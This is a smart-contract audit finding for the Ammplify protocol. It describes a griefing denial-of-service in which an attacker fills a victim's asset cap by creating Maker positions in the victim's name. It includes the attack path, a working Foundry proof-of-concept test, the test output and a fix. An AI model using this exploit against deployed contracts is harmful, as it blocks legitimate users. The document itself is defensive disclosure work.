# M-1  Denial-of-Service (Griefing): Attacker can force-create Maker assets for a victim, exhausting MAX_ASSETS_PER_OWNER and blocking legitimate Maker positions


## Summary

The `AssetLib.newMaker(...)` at `Asset.sol :51` unconditionally
registers newly created assets for any provided recipient address
without validating whether the recipient consented.

This will cause a denial-of-service for liquidity providers (victims),
as an attacker can repeatedly call
`Maker.sol.newMaker(recipient = victim, …)` function to artificially
fill the victim's `ownerAssets[victim]` array up to the protocol-defined
limit `MAX_ASSETS_PER_OWNER`.

Once full, the victim will be unable to create new Maker positions under
their address. Although the victim can recover by using
`Maker.sol.removeAsset(...)` function to revoke these spammed assets,
this imposes unnecessary gas costs and operational burden on them,
effectively griefing or blocking normal participation in the protocol.


## Root Cause

In `Maker.sol :20` the `newMaker(...)` function creates an Asset and
associates it with the recipient account without requiring recipient
consent.

In `Asset.sol :139` the `addAssetToOwner(...)` function appends the
asset ID to recipient address:

``` solidity
store.ownerAssets[owner].push(assetId);
```

The per-owner limit `MAX_ASSETS_PER_OWNER` (defined in `AssetLib` at
`Asset.sol :44`) is enforced at insertion time into the owner index, so
unsolicited additions count towards the victim's cap.

Token settlement is performed using the caller as the payer:

``` solidity
RFTLib.settle(msg.sender, ...);
```

That means attacker (caller) funds the gifted positions but the `owner`
field is set to the recipient.

So, the attacker repeatedly calls `newMaker(...)` until
`MAX_ASSETS_PER_OWNER` is exhausted, depriving the recipient from
creating new assets.


## Affected Lines of Code

-   https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/facets/Maker.sol#L20C3-L53C1\
-   https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/Asset.sol#L51C4-L74C6\
-   https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/Asset.sol#L139C4-L145C6


## Internal Pre-conditions

-   Attacker must be able to call
    `Maker.sol.newMaker(recipient = victim, ...)` repeatedly.
-   Attacker must fund the maker position (tokens pulled from
    `msg.sender` via `RFTLib.settle(...)`).
-   `MIN_MAKER_LIQUIDITY` is small enough to make repeated cheap calls.

``` solidity
uint128 public constant MIN_MAKER_LIQUIDITY = 1e6;
```

-   `MAX_ASSETS_PER_OWNER` is low enough to be practically exhausted.

``` solidity
uint8 public constant MAX_ASSETS_PER_OWNER = 16;
```


## External Pre-conditions

Token decimals matter:

-   If pool token has 18 decimals, `1e6` units is dust (1e-12 token).
-   If pool token has 6 decimals (USDC style), `1e6` units = 1 token.

Attack cost is therefore highly dependent on the token pair used in the
pool.

## Attack Path

1.  Attacker calls:

``` solidity
Maker.sol.newMaker(recipient = victim, poolAddr, lowTick, highTick, liq = MIN_MAKER_LIQUIDITY, ...);
```

2.  `AssetLib.newMaker(...)` creates the Asset and sets:

``` solidity
asset.owner = victim;
```

3.  `AssetLib.addAssetToOwner(...)` appends the asset ID to:

``` solidity
Store.assets().ownerAssets[victim];
```

4.  `RFTLib.settle(msg.sender, ...)` pulls tokens from attacker.

5.  Attacker repeats until:

```solidity
    ownerAssets[victim].length == MAX_ASSETS_PER_OWNER (16)
```
6.  Victim attempts to create new Maker → reverts:

``` solidity
require(
    store.ownerAssets[owner].length < MAX_ASSETS_PER_OWNER,
    ExcessiveAssetsPerOwner(store.ownerAssets[owner].length)
);
```

7.  Victim must call `removeMaker(...)` (Maker.sol :100) to recover ---
    gas cost imposed.


## Impact

1. Affected party: targeted users (victims) who want to create Maker LP positions.

2. Denial-of-service — victim cannot create new Maker positions while their `ownerAssets` array is full.

3. Attacker gain/loss: attacker loses small amounts of liquidity (pays for gifted positions) but gains operational leverage (blocking the victim). This is cost-effective vs. disruption.


## PoC

Create file at Ammplify/test/MakerFacetDOS.t.sol

Paste the following:

``` solidity
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.27;  
  
import { Test } from "forge-std/Test.sol";  
import { UniswapV3Pool } from "v3-core/UniswapV3Pool.sol";  
import { MultiSetupTest } from "./MultiSetup.u.sol";   
import { MockERC20 } from "./mocks/MockERC20.sol";   
import { MakerFacet } from "../src/facets/Maker.sol";   
import { ViewFacet } from "../src/facets/View.sol";   
import { PoolInfo } from "../src/Pool.sol";  
import { LiqType } from "../src/walkers/Liq.sol";  
  
/// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)  
uint160 constant MIN_SQRT_RATIO = 4295128739;  
/// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)  
uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;  
  
contract MakerFacetTest is MultiSetupTest {  
  
    UniswapV3Pool public pool;  
    address public recipient;  
    address public poolAddr;  
    int24 public lowTick;  
    int24 public highTick;  
    uint128 public liquidity;  
    uint160 public minSqrtPriceX96;  
    uint160 public maxSqrtPriceX96;  
  
    PoolInfo public poolInfo;  
  
    function setUp() public {  
        _newDiamond();  
        (, address _pool, address _token0, address _token1) = setUpPool();  
  
        token0 = MockERC20(_token0);  
        token1 = MockERC20(_token1);  
        pool = UniswapV3Pool(_pool);  
  
        // Set up recipient and basic test parameters  
        recipient = address(this);  
        poolAddr = _pool;  
        lowTick = -600;  
        highTick = 600;  
        liquidity = 100e18;  
        addPoolLiq(0, lowTick, highTick, liquidity);  
        minSqrtPriceX96 = MIN_SQRT_RATIO;  
        maxSqrtPriceX96 = MAX_SQRT_RATIO;  
  
        poolInfo = viewFacet.getPoolInfo(poolAddr);  
  
        // Fund this contract for testing  
        _fundAccount(address(this));  
  
        // Create vaults for the pool tokens  
        _createPoolVaults(poolAddr);  
    }  
  
    // DOS  
  
 function testNewMakerDOS() public {  
  
    address attacker = address(0xBEEF);  
    address victim   = address(0xCAFE);  
    uint128 mintLiq = uint128(1e6); // MIN_MAKER_LIQUIDITY  
          
         // Fund attacker and victim for test  
        deal(attacker, 10 ether);  
        deal(victim, 10 ether);  
  
        // mint tokens to attacker (assumes your setup used token0/token1 names)  
        MockERC20(address(token0)).mint(attacker, 1e24);  
        MockERC20(address(token1)).mint(attacker, 1e24);  
        MockERC20(address(token0)).mint(victim, 1e24);  
        MockERC20(address(token1)).mint(victim, 1e24);  
  
  
        PoolInfo memory pInfo = poolInfo;  
        bytes memory rftData = "";  
  
        // Attacker gifts MAX_ASSETS_PER_OWNER maker assets to victim  
        for (uint i = 0; i < 16; ++i) {  
            vm.startPrank(attacker);  
            makerFacet.newMaker(  
                victim,  
                pInfo.poolAddr,  
                int24(-600),  
                int24(600),  
                mintLiq,  
                false,  
                uint160(0),  
                type(uint160).max,  
                rftData  
            );  
            vm.stopPrank();  
        }  
  
        // Now victim tries to create one — it should revert due to ExcessiveAssetsPerOwner(16)  
        vm.startPrank(victim);  
        vm.expectRevert();  
        makerFacet.newMaker(  
            victim,  
            pInfo.poolAddr,  
            int24(-600),  
            int24(600),  
            mintLiq,  
            false,  
            uint160(0),  
            type(uint160).max,  
            rftData  
        );  
        vm.stopPrank();  
    }  
}  
```

- Run `forge test --mt testNewMakerDOS .`
- 
OutPut of the Test :
```solidity
Ran 1 test for test/MakerFacetDOS.t.sol:MakerFacetTest  
[PASS] testNewMakerDOS() (gas: 30081157)  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 221.86ms (191.31ms CPU time)  
  
Ran 1 test suite in 242.39ms (221.86ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  
```
- Then Run `forge test --mt testNewMakerDOS -vvvv `.
Output :
```solidity
  ,,,,  
   
    │   ├─ [72698] MakerFacet::newMaker(0x000000000000000000000000000000000000cafE, UniswapV3Pool: [0x3fb4335bCFd0F25Aa1226a8B106dAC739b840980], -600, 600, 1000000 [1e6], false, 0, 1461501637330902918203684832716283019655932542975 [1.461e48], 0x) [delegatecall]  
    │   │   ├─ [204] UniswapV3Pool::token0() [staticcall]  
    │   │   │   └─ ← [Return] MockERC20: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]  
    │   │   ├─ [675] UniswapV3Pool::token1() [staticcall]  
    │   │   │   └─ ← [Return] MockERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]  
    │   │   ├─ [643] UniswapV3Pool::tickSpacing() [staticcall]  
    │   │   │   └─ ← [Return] 60  
    │   │   └─ ← [Revert] ExcessiveAssetsPerOwner(16)  
    │   └─ ← [Revert] ExcessiveAssetsPerOwner(16)  
    ├─ [0] VM::stopPrank()  
    │   └─ ← [Return]   
    └─ ← [Stop]   
  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 180.85ms (156.40ms CPU time)  
  
Ran 1 test suite in 1.09s (180.85ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  
```

## Mitigation

- Add recipient consent validation in `Maker.sol :20`. This immediately blocks the attack with a tiny change.

``` solidity
  
function newMaker(  
        address recipient,  
        address poolAddr,  
        int24 lowTick,  
        int24 highTick,  
        uint128 liq,  
        bool isCompounding,  
        uint160 minSqrtPriceX96,  
        uint160 maxSqrtPriceX96,  
        bytes calldata rftData  
    ) external nonReentrant returns (uint256 _assetId) {  
        require(liq >= MIN_MAKER_LIQUIDITY, DeMinimusMaker(liq));  
  
        // 🟢 Added        
        require(recipient == msg.sender, "recipient must be caller");  
  
        PoolInfo memory pInfo = PoolLib.getPoolInfo(poolAddr);  
        (Asset storage asset, uint256 assetId) = AssetLib.newMaker(  
            recipient,  
            pInfo,  
            lowTick,  
            highTick,  
            liq,  
            isCompounding  
        );  
        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, liq);  
        // This fills in the nodes in the asset.  
        WalkerLib.modify(pInfo, lowTick, highTick, data);  
        // Settle balances.  
        address[] memory tokens = pInfo.tokens();  
        int256[] memory balances = new int256[](2);  
        balances[0] = data.xBalance;  
        balances[1] = data.yBalance;  
        RFTLib.settle(msg.sender, tokens, balances, rftData);  
        PoolWalker.settle(pInfo, lowTick, highTick, data);  
        return assetId;  
    }  
  
```
